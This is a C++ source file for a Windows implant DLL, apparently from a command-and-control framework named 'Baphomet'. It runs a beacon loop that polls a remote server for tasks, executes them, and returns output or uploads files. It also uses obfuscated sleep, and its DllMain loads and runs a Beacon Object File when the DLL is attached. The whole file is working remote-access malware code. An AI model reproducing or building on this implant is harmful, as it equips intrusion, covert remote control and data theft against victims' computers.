#include "main.hpp"
#include "tasking/injection/bof/beacon_api.hpp"
#pragma comment(lib,"winhttp.lib")

command_output
process_command(
        _In_ const std::string& command_str,
        _In_ const char delimeter,
        _In_ const implant_context& ctx
);


//
// for testing purposes
//
bool read_from_disk(const std::string& file_name, std::string& outbuff) {

    HANDLE hFile = CreateFileA(
        file_name.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD file_size = GetFileSize(hFile, nullptr);
    if(file_size == INVALID_FILE_SIZE) {
        return false;
    }

    outbuff.resize(file_size);
    DWORD bytesread = 0;
    if(!ReadFile(
        hFile,
        outbuff.data(),
        file_size,
        &bytesread,
        nullptr
    ) || bytesread != file_size) {
        return false;
    }

    CloseHandle(hFile);
    return true;
}





bool
recieve_commands(implant_context& ctx) {

    std::string task;

    auto _ = defer([&]() {
       if(ctx.hsession != nullptr) {
           WinHttpCloseHandle(ctx.hsession);
       }
        if(ctx.hconnect != nullptr) {
            WinHttpCloseHandle(ctx.hconnect);
        }
    });

    if(!networking::http::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
        return false;
    }

    if(!networking::http::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
        return false;
    }

    while(true) {
        obfus::sleep(ctx.sleep_time);

        task.clear();
        if(!networking::http::send_object_message(
            ctx.hconnect,
            ctx.callback_object,
            "get_task",
            ctx.session_token,
            ctx.is_https,
            task
        )) {
            #ifdef BAPHOMET_DEBUG
                std::cout << "[*] no task." << std::endl;
            #endif
            continue;
        }

        #ifdef BAPHOMET_DEBUG
            std::cout << "[+] recieved task: " << task << std::endl;
        #endif


        auto [txt_output, file_to_upload, type] = process_command(task, COMMAND_DELIMITER, ctx);
        obfus::sleep(ctx.sleep_time);

        bool success = false;
        if(type == output_type::PLAIN_TEXT) {

            #ifdef  BAPHOMET_DEBUG
                std::cout << "[+] Sending response:\n" << txt_output << std::endl;
            #endif

            success = networking::http::send_object_message(
                ctx.hconnect,
                ctx.callback_object,
                "complete_task --result " + txt_output,
                ctx.session_token,
                ctx.is_https,
                task
            );
        }

        if(type == output_type::FILE) {
            success = networking::http::upload_file(
                ctx.hconnect,
                ctx.callback_object,
                file_to_upload,
                ctx.session_token,
                ctx.is_https
            );
            CloseHandle(file_to_upload);
        }

        #ifdef BAPHOMET_DEBUG
            if(success) {
                std::cout << "[+] Successfully sent response to: " << ctx.callback_object << std::endl;
            } else {
                std::cout << "[!] Failed to send response!" << std::endl;
            }
        #endif

        if(task == std::string("die") + COMMAND_DELIMITER) {
            break;
        }
    }

    #ifdef BAPHOMET_DEBUG
        std::cout << "[+] Exiting..." << std::endl;
    #endif

    return true;
}



//
// TODO: add CFG valid call targets for sleep obf
//

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {


    /*
    implant_context ctx;
    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
    ctx.session_token = "NVJrNTVJdGRHOVBvSmJiaThIeGs4U0tUcQ==";
    ctx.server_addr = "127.0.0.1";
    ctx.port = 8081;
    ctx.is_https = false;
    ctx.user_agent = "test program/1.0";
    ctx.sleep_time = 2500;
    ctx.jitter = 0;
    */

    std::string bof;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            if(!read_from_disk("whoami.x64.o", bof)) {
                return FALSE;
            }

            std::cout << "BOF OUTPUT:\n" << tasking::execute_bof(bof, nullptr, 0) << std::endl;
            std::cout << "[+] BOF execution successful!" << std::endl;

            break;
        case DLL_THREAD_ATTACH:
            printf("[+] thread attach.\n");
            break;
        case DLL_THREAD_DETACH:
            printf("[+] thread detach.\n");
            break;
        case DLL_PROCESS_DETACH:
            printf("[+] process detach.\n");
            break;
    }


    return TRUE;
}
